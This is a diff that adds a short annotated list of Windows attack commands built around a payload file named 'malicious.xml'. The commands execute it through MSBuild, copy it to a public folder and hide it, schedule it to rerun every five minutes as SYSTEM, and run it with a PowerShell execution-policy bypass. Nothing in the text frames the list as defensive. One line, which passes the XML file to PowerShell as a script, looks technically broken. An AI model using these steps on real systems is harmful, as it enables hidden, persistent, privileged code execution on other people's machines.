@@ -1,0 +1,11 @@
+msbuild malicious.xml                          # Run a payload embedded in XML
+copy malicious.xml C:\Users\Public\            # Move payload to public location
+attrib +h C:\Users\Public\malicious.xml        # Hide the file
+schtasks /create /tn updater /tr "msbuild malicious.xml" /sc minute /mo 5 /ru SYSTEM
+                                               # Scheduled delivery
+notepad malicious.xml                          # Open the malicious build file for editing
+type malicious.xml                             # Display XML content
+tasklist | findstr msbuild                     # Check if MSBuild is running
+powershell -ep bypass -f malicious.xml         # Alternative execution
+msbuild /nologo /verbosity:quiet malicious.xml # Quiet mode execution
+whoami                                         # Confirm context of execution
